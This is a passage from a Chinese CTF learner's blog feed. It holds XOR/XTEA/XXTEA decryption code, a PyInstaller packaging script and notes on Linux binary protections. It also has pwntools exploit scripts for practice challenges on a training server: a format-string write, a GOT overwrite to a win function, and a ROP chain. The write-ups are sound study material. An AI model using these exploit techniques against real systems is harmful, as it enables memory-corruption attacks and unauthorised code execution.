UTF-8 字符串；</span></span><br><span class="line"><span class="string">    如果失败，则返回其十六进制表示。</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    :param ciphertext: 密文（bytes）</span></span><br><span class="line"><span class="string">    :param key: 解密密钥（字符串或 bytes）</span></span><br><span class="line"><span class="string">    :return: 可读明文（字符串）或错误信息</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decrypted_bytes = xor_encrypt_decrypt(ciphertext, key)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> decrypted_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment"># 尝试作为文本返回</span></span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            <span class="keyword">return</span> decrypted_bytes.<span class="built_in">hex</span>()  <span class="comment"># 否则返回 hex 字符串</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;🛑 解密错误: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 提供别名，方便外部调用 decrypt(data, key)</span></span><br><span class="line">decrypt = xor_decrypt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试用例（仅当直接运行此模块时执行）</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    test_key = <span class="string">&quot;mysecretpassword&quot;</span></span><br><span class="line">    original_text = <span class="string">&quot;Hello, world! This is a test.&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;原文:&quot;</span>, original_text)</span><br><span class="line"></span><br><span class="line">    encrypted_data = xor_encrypt_decrypt(original_text, test_key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;加密结果 (hex):&quot;</span>, encrypted_data.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line">    decrypted_text = xor_decrypt(encrypted_data, test_key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密结果:&quot;</span>, decrypted_text)</span><br></pre></td></tr></table></figure>

<p>xtea.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt1</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;XTEA解密算法&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 确保密钥长度为16字节</span></span><br><span class="line">        key_bytes = key.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(key_bytes) &lt; <span class="number">16</span>:</span><br><span class="line">            key_bytes = key_bytes.ljust(<span class="number">16</span>, <span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(key_bytes) &gt; <span class="number">16</span>:</span><br><span class="line">            key_bytes = key_bytes[:<span class="number">16</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 转换密文为字节</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>(c <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdefABCDEF&#x27;</span> <span class="keyword">for</span> c <span class="keyword">in</span> ciphertext) <span class="keyword">and</span> <span class="built_in">len</span>(ciphertext) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            cipher_bytes = <span class="built_in">bytes</span>.fromhex(ciphertext)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cipher_bytes = ciphertext.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 确保数据长度是8的倍数</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(cipher_bytes) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">            padding = <span class="number">8</span> - (<span class="built_in">len</span>(cipher_bytes) % <span class="number">8</span>)</span><br><span class="line">            cipher_bytes += <span class="string">b&#x27;\0&#x27;</span> * padding</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 分块解密</span></span><br><span class="line">        decrypted = <span class="built_in">bytearray</span>()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cipher_bytes), <span class="number">8</span>):</span><br><span class="line">            block = cipher_bytes[i:i+<span class="number">8</span>]</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 解包为两个32位整数</span></span><br><span class="line">            v0, v1 = <span class="built_in">int</span>.from_bytes(block[:<span class="number">4</span>], <span class="string">&#x27;big&#x27;</span>), <span class="built_in">int</span>.from_bytes(block[<span class="number">4</span>:], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">            k = [<span class="built_in">int</span>.from_bytes(key_bytes[i*<span class="number">4</span>:(i+<span class="number">1</span>)*<span class="number">4</span>], <span class="string">&#x27;big&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># XTEA解密过程</span></span><br><span class="line">            delta = <span class="number">0x9E3779B9</span></span><br><span class="line">            sum_val = (delta * <span class="number">32</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">                v1 = ((v1 - (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum_val + k[(sum_val &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">                sum_val = (sum_val - delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">                v0 = ((v0 - (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum_val + k[sum_val &amp; <span class="number">3</span>]))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 打包解密结果</span></span><br><span class="line">            decrypted_block = v0.to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>) + v1.to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">            decrypted.extend(decrypted_block)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> decrypted.decode(<span class="string">&#x27;utf-8&#x27;</span>).rstrip(<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            <span class="keyword">return</span> decrypted.<span class="built_in">hex</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;🛑 解密错误: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>xxtea.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;XXTEA解密算法&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 确保密钥长度为16字节</span></span><br><span class="line">        key_bytes = key.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(key_bytes) &lt; <span class="number">16</span>:</span><br><span class="line">            key_bytes = key_bytes.ljust(<span class="number">16</span>, <span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(key_bytes) &gt; <span class="number">16</span>:</span><br><span class="line">            key_bytes = key_bytes[:<span class="number">16</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 转换密文为字节</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>(c <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdefABCDEF&#x27;</span> <span class="keyword">for</span> c <span class="keyword">in</span> ciphertext) <span class="keyword">and</span> <span class="built_in">len</span>(ciphertext) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            cipher_bytes = <span class="built_in">bytes</span>.fromhex(ciphertext)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cipher_bytes = ciphertext.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 确保数据长度是4的倍数</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(cipher_bytes) % <span class="number">4</span> != <span class="number">0</span>:</span><br><span class="line">            padding = <span class="number">4</span> - (<span class="built_in">len</span>(cipher_bytes) % <span class="number">4</span>)</span><br><span class="line">            cipher_bytes += <span class="string">b&#x27;\0&#x27;</span> * padding</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 解包为32位整数数组</span></span><br><span class="line">        n = <span class="built_in">len</span>(cipher_bytes) // <span class="number">4</span></span><br><span class="line">        v = [<span class="built_in">int</span>.from_bytes(cipher_bytes[i*<span class="number">4</span>:(i+<span class="number">1</span>)*<span class="number">4</span>], <span class="string">&#x27;big&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">        k = [<span class="built_in">int</span>.from_bytes(key_bytes[i*<span class="number">4</span>:(i+<span class="number">1</span>)*<span class="number">4</span>], <span class="string">&#x27;big&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># XXTEA解密过程</span></span><br><span class="line">        delta = <span class="number">0x9E3779B9</span></span><br><span class="line">        q = <span class="number">6</span> + <span class="number">52</span> // n</span><br><span class="line">        sum_val = delta * q</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(q):</span><br><span class="line">            e = (sum_val &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n-<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">                v[p] = (v[p] - (((v[p-<span class="number">1</span>] &lt;&lt; <span class="number">4</span>) ^ (v[p-<span class="number">1</span>] &gt;&gt; <span class="number">5</span>)) + v[p-<span class="number">1</span>]) ^ (sum_val + k[(p+e) % <span class="number">4</span>])) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            v[<span class="number">0</span>] = (v[<span class="number">0</span>] - (((v[n-<span class="number">1</span>] &lt;&lt; <span class="number">4</span>) ^ (v[n-<span class="number">1</span>] &gt;&gt; <span class="number">5</span>)) + v[n-<span class="number">1</span>]) ^ (sum_val + k[e])) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            sum_val = (sum_val - delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 打包解密结果</span></span><br><span class="line">        decrypted = <span class="built_in">bytearray</span>()</span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> v:</span><br><span class="line">            decrypted.extend(num.to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> decrypted.decode(<span class="string">&#x27;utf-8&#x27;</span>).rstrip(<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            <span class="keyword">return</span> decrypted.<span class="built_in">hex</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;🛑 解密错误: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用示例</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 示例1: 解密十六进制格式的密文</span></span><br><span class="line">    ciphertext = <span class="string">&quot;0123456789abcdef&quot;</span>  <span class="comment"># 示例密文（十六进制）</span></span><br><span class="line">    key = <span class="string">&quot;1234567890123456&quot;</span>        <span class="comment"># 16字节密钥</span></span><br><span class="line">    plaintext = decrypt(ciphertext, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;解密结果: <span class="subst">&#123;plaintext&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 示例2: 解密字符串格式的密文</span></span><br><span class="line">    ciphertext = <span class="string">&quot;encrypted_data&quot;</span>    <span class="comment"># 示例密文（字符串）</span></span><br><span class="line">    key = <span class="string">&quot;mysecretkey1234&quot;</span>          <span class="comment"># 16字节密钥</span></span><br><span class="line">    plaintext = decrypt(ciphertext, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;解密结果: <span class="subst">&#123;plaintext&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>package.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_dependencies</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;检查并安装必要的依赖&quot;&quot;&quot;</span></span><br><span class="line">    required = [</span><br><span class="line">        <span class="string">&#x27;pyinstaller&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;opencv-python&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pillow&#x27;</span></span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> tkinter</span><br><span class="line">    <span class="keyword">except</span> ImportError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;错误: 需要安装 tkinter (通常是 Python 自带)&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> package <span class="keyword">in</span> required:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">__import__</span>(package)</span><br><span class="line">        <span class="keyword">except</span> ImportError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;正在安装 <span class="subst">&#123;package&#125;</span>...&quot;</span>)</span><br><span class="line">            subprocess.check_call([sys.executable, <span class="string">&quot;-m&quot;</span>, <span class="string">&quot;pip&quot;</span>, <span class="string">&quot;install&quot;</span>, package])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_exe</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;构建 EXE 文件&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 获取当前脚本所在目录</span></span><br><span class="line">    base_dir = Path(__file__).parent</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 视频文件路径 (确保视频文件存在)</span></span><br><span class="line">    video_file = <span class="string">&quot;富士山的星空.mp4&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (base_dir / video_file).exists():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误: 视频文件 <span class="subst">&#123;video_file&#125;</span> 不存在!&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 图标文件路径 (可选)</span></span><br><span class="line">    icon_file = <span class="string">&quot;linkpwn.ico&quot;</span></span><br><span class="line">    icon_param = <span class="string">f&quot;--icon=<span class="subst">&#123;icon_file&#125;</span>&quot;</span> <span class="keyword">if</span> (base_dir / icon_file).exists() <span class="keyword">else</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 加密模块列表</span></span><br><span class="line">    crypto_modules = [<span class="string">&#x27;xor1&#x27;</span>, <span class="string">&#x27;rc4&#x27;</span>, <span class="string">&#x27;tea&#x27;</span>, <span class="string">&#x27;xtea&#x27;</span>, <span class="string">&#x27;xxtea&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 构建 PyInstaller 命令</span></span><br><span class="line">    cmd = [</span><br><span class="line">        <span class="string">&#x27;pyinstaller&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--onefile&#x27;</span>,           <span class="comment"># 打包成单个文件</span></span><br><span class="line">        <span class="string">&#x27;--windowed&#x27;</span>,           <span class="comment"># 不显示控制台窗口</span></span><br><span class="line">        <span class="string">&#x27;--noconsole&#x27;</span>,          <span class="comment"># 同 --windowed</span></span><br><span class="line">        <span class="string">&#x27;--clean&#x27;</span>,              <span class="comment"># 清理临时文件</span></span><br><span class="line">        <span class="string">&#x27;--noconfirm&#x27;</span>,          <span class="comment"># 覆盖输出目录不提示</span></span><br><span class="line">        <span class="string">&#x27;--name=linkpwntool&#x27;</span>,   <span class="comment"># 输出文件名</span></span><br><span class="line">        <span class="string">&#x27;--add-data&#x27;</span>, <span class="string">f&#x27;<span class="subst">&#123;video_file&#125;</span>;.&#x27;</span>,  <span class="comment"># 添加视频文件</span></span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 添加图标 (如果存在)</span></span><br><span class="line">    <span class="keyword">if</span> icon_param:</span><br><span class="line">        cmd.append(icon_param)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 添加加密模块</span></span><br><span class="line">    <span class="keyword">for</span> mod <span class="keyword">in</span> crypto_modules:</span><br><span class="line">        mod_file = <span class="string">f&quot;<span class="subst">&#123;mod&#125;</span>.py&quot;</span></span><br><span class="line">        <span class="keyword">if</span> (base_dir / mod_file).exists():</span><br><span class="line">            cmd.extend([<span class="string">&#x27;--add-data&#x27;</span>, <span class="string">f&#x27;<span class="subst">&#123;mod_file&#125;</span>;.&#x27;</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;警告: 加密模块 <span class="subst">&#123;mod_file&#125;</span> 不存在!&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 添加主程序</span></span><br><span class="line">    cmd.append(<span class="string">&#x27;main.py&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 执行打包命令</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;开始打包...&quot;</span>)</span><br><span class="line">        subprocess.check_call(cmd)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n打包成功! EXE 文件位于 dist/ 目录&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 复制视频文件到 dist 目录 (PyInstaller 的 --add-data 有时会失效)</span></span><br><span class="line">        <span class="keyword">if</span> (base_dir / <span class="string">&#x27;dist&#x27;</span>).exists():</span><br><span class="line">            <span class="keyword">import</span> shutil</span><br><span class="line">            shutil.copy(base_dir / video_file, base_dir / <span class="string">&#x27;dist&#x27;</span> / video_file)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;已复制视频文件到 dist 目录&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n打包失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n发生错误: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    check_dependencies()</span><br><span class="line">    build_exe()</span><br></pre></td></tr></table></figure>

<p>运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 package.py  #mp4可自己选择把脚本中的mp4换成你自己mp4的名字；或者你直接把自己的MP4名字换成富士山的星空</span><br></pre></td></tr></table></figure>

<p>运行成功在dist下有个exe，点击运行即可</p>
]]></content>
      <categories>
        <category>linkpwn的编程学习</category>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>linuxd的二进制保护机制学习</title>
    <url>/2025/02/20/linuxd%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="一、二进制保护一共五种"><a href="#一、二进制保护一共五种" class="headerlink" title="一、二进制保护一共五种"></a>一、二进制保护一共五种</h2><p><img src="/2025/02/20/linuxd%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/1.png" alt="1"></p>
<ul>
<li><ol>
<li><a href="#ASLR">ASLR</a></li>
<li><a href="#RELRO">RELRO</a></li>
<li><a href="#Stack">Stack</a></li>
<li><a href="#NX">NX</a></li>
<li><a href="#PIE">PIE</a></li>
</ol>
</li>
</ul>
<h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><p>ASLR：地址空间随机化，proc&#x2F;sys&#x2F;kermel&#x2F;randomize_va_space里的值可以控制系统级的ASLR，使用root权限可以进行修改，有三个值可以设置，具体说明如下。</p>
<ul>
<li>0:关闭 ASLR。</li>
<li>1:mmap base、stack、vdsopage将随机化。这意味着“.so”文件将被加载到随机地址。链接时指定了-pie选项的可执行程序，其代码段加载地址将被随机化。配置内核时如果指定了CONFIG_COMPAT_BRK，则randomize_va_space 默认为1，此时 heap 没有随机化。</li>
<li>2:在1的基础上增加了heap随机化。配置内核时如果禁用CONFIG_COMPAT_BRK，则randomize_va_space默认为2。ASLR 可以保证在每次程序加载的时候自身和所加载的库文件都会被映射到虚拟地址空间的不同地址处。</li>
</ul>
<h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><p>RELRO: 重定位，一般会分为两种情况，即partial relro和full relro，具体区别就是前者重定位信息(如got表)可写，而后者不可写。</p>
<h2 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h2><p>Stack:栈溢出保护，gcc编译程序默认开启，添加编译选项-fno-stack-protector会关闭程序的 stack canary 栈保护。</p>
<h2 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h2><p>NX:数据执行保护，即DEP(Data Execution Prevention)，是指禁止程序在非可执行的内存区(non-executable memory)中执行指令。在80x86体系结构中，操作系统的内存管理是通过页面表(pege table)存储方式来实现的，其最后一位就是NX位，0表示允许执行代码,1表示禁止换行代码。一般来说，NX主要是防止直接在栈(stack)和堆(heap)上运行shellcode 代码。 gcc默认开启不可执行栈功能，添加编译选项-zexecstack即可开启栈可执行功能。</p>
<h2 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h2><p>PIE:代码段随机化，具体见ASLR。</p>
]]></content>
      <categories>
        <category>PWN</category>
        <category>总结</category>
        <category>保护机制</category>
      </categories>
  </entry>
  <entry>
    <title>jarvisoj_fm(格式化字符串)</title>
    <url>/2025/02/10/jarvisoj-fm-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<h1 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h1><ol>
<li><p>首先可以去了解一下格式化话字符串漏洞看看<a href="https://www.cnblogs.com/falling-dusk/p/17858030.html">佬的博客</a></p>
</li>
<li><p>可以利用格式化字符串漏洞<br><img src="/2025/02/10/jarvisoj-fm-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/1.png" alt="1"></p>
</li>
<li><p>先查看偏移量（aaaa与0x61616161之间的距离,0x61是a的ASCII值）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aaaa %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p</span><br></pre></td></tr></table></figure>

<p><img src="/2025/02/10/jarvisoj-fm-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/2.png" alt="2"></p>
</li>
<li><p>查找x的地址<br><img src="/2025/02/10/jarvisoj-fm-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/3.png" alt="3"></p>
</li>
<li><p>构造exp.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./fm&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">26501</span>)</span><br><span class="line"></span><br><span class="line">x = <span class="number">0x0804A02C</span></span><br><span class="line">payload = p32(x)+<span class="string">b&quot;%11$hhn&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
</li>
<li><p>得到flag<br><img src="/2025/02/10/jarvisoj-fm-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/4.png" alt="4"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>PWN</category>
        <category>刷题记录</category>
        <category>stack</category>
      </categories>
  </entry>
  <entry>
    <title>picoctf_2018_got_shell(逻辑漏洞)</title>
    <url>/2025/03/20/picoctf-2018-got-shell-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>pwn的题一般是栈溢出，格式化漏洞，堆利用，逻辑漏洞</p>
<p>其中据我了解堆利用比栈的难度高很多，逻辑漏洞更是灵活。</p>
<p>这次恰好碰到一个逻辑漏洞记录一下。</p>
<p><img src="/2025/03/20/picoctf-2018-got-shell-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/1.png" alt="1"></p>
<p>所以可以直接写exp了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r=remote(&#x27;node5.buuoj.cn&#x27;,25642)</span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./PicoCTF_2018_got-shell&#x27;)</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">win_addr=0x0804854B</span><br><span class="line"></span><br><span class="line">r.sendlineafter(b&quot;I&#x27;ll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?&quot;, hex(puts_got))</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(hex(win_addr))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>PWN</category>
        <category>刷题记录</category>
        <category>stack</category>
      </categories>
  </entry>
  <entry>
    <title>picoctf_2018_rop chain(传参)</title>
    <url>/2025/02/18/picoctf-2018-rop-chain-%E4%BC%A0%E5%8F%82/</url>
    <content><![CDATA[<ol>
<li><p>记录一个传参的pwn题</p>
</li>
<li><p>比较简单直接把exp，写详细点</p>
<p>win_function2是win_function1的返回地址，p32(win_function2)有参数，flag + 0xBAAAAAAD分别是win_function2的返回地址和参数，0xBAAAAAAD +0xDEADBAAD分别是flag的返回地址和参数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r = process(&#x27;./PicoCTF_2018_rop_chain&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>, <span class="number">29125</span>)</span><br><span class="line">offset = <span class="number">0x18</span> + <span class="number">0x04</span>  </span><br><span class="line">win_function1 = <span class="number">0x80485CB</span></span><br><span class="line">win_function2 = <span class="number">0x80485D8</span></span><br><span class="line">flag = <span class="number">0x804862B</span></span><br><span class="line">payload = offset * <span class="string">b&#x27;a&#x27;</span> + p32(win_function1) + p32(win_function2) +  p32(flag) + p32(<span class="number">0xBAAAAAAD</span>) +p32(<span class="number">0xDEADBAAD</span>) </span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

</li>
<li><p>还有一种方式就是将返回地址设置为ebp</p>
